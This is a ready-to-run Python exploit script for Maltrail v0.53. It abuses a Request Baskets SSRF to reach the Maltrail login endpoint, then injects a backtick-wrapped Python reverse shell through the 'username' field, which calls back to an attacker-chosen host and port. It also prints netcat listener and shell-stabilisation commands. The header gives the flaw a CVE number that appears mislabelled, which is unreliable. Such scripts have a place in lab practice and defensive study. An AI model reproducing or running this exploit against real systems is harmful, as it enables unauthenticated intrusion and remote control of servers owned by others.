#!/usr/bin/env python3

"""
Maltrail v0.53 - Unauthenticated RCE Exploit
CVE-2023-26035
Combines SSRF (CVE-2023-27163) + Command Injection
"""

import requests
import sys
import urllib.parse
import argparse

def exploit(target, lhost, lport, basket_name, basket_token):
    """
    Exploit Maltrail v0.53 RCE via Request Baskets SSRF
    """
    
    print("═" * 60)
    print("🎯 Maltrail v0.53 RCE Exploit (via SSRF)")
    print("═" * 60)
    print()
    
    # Step 1: Configure SSRF basket to forward to Maltrail
    print("[*] Step 1: Configuring SSRF basket to access Maltrail (port 80)...")
    basket_url = f"{target}/api/baskets/{basket_name}"
    
    basket_config = {
        "forward_url": "http://127.0.0.1:80",
        "proxy_response": False,  # Don't need response for exploit
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }
    
    headers = {
        "Authorization": basket_token,
        "Content-Type": "application/json"
    }
    
    try:
        r = requests.put(basket_url, json=basket_config, headers=headers, timeout=5)
        print(f"[+] Basket configured! Status: {r.status_code}")
    except Exception as e:
        print(f"[-] Failed to configure basket: {e}")
        sys.exit(1)
    
    print()
    
    # Step 2: Craft reverse shell payload
    print("[*] Step 2: Creating reverse shell payload...")
    
    # Python reverse shell (more reliable)
    revshell = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
    
    # Command injection payload
    payload = f";`{revshell}`"
    
    print(f"[+] Payload created: {payload[:50]}...")
    print()
    
    # Step 3: Send exploit
    print("[*] Step 3: Sending exploit to Maltrail login endpoint...")
    print(f"[*] Target: {target}/{basket_name}/login")
    print(f"[*] Listener should be at: {lhost}:{lport}")
    print()
    
    exploit_url = f"{target}/{basket_name}/login"
    exploit_data = {
        "username": payload
    }
    
    try:
        print("[*] Triggering RCE... Check your listener!")
        r = requests.post(exploit_url, data=exploit_data, timeout=5)
        print(f"[+] Exploit sent! Status: {r.status_code}")
    except requests.exceptions.Timeout:
        print("[+] Request timed out (expected - shell may have connected!)")
    except Exception as e:
        print(f"[!] Exploit attempt: {e}")
    
    print()
    print("═" * 60)
    print("✅ Exploit complete! Check your netcat listener!")
    print("═" * 60)
    print()
    print("If you got a shell, stabilize it:")
    print("  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print("  export TERM=xterm")
    print("  [Ctrl+Z]")
    print("  stty raw -echo; fg")
    print()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Maltrail v0.53 RCE via SSRF")
    parser.add_argument("-t", "--target", required=True, help="Request Baskets URL (e.g., http://10.129.229.26:55555)")
    parser.add_argument("-l", "--lhost", required=True, help="Your IP for reverse shell")
    parser.add_argument("-p", "--lport", type=int, default=4444, help="Your port for reverse shell (default: 4444)")
    parser.add_argument("-b", "--basket", default="pwned", help="Basket name (default: pwned)")
    parser.add_argument("-k", "--token", required=True, help="Basket authorization token")
    
    args = parser.parse_args()
    
    print()
    print("⚠️  BEFORE RUNNING: Start your listener!")
    print(f"   nc -lvnp {args.lport}")
    print()
    input("Press Enter when listener is ready...")
    print()
    
    exploit(args.target, args.lhost, args.lport, args.basket, args.token)

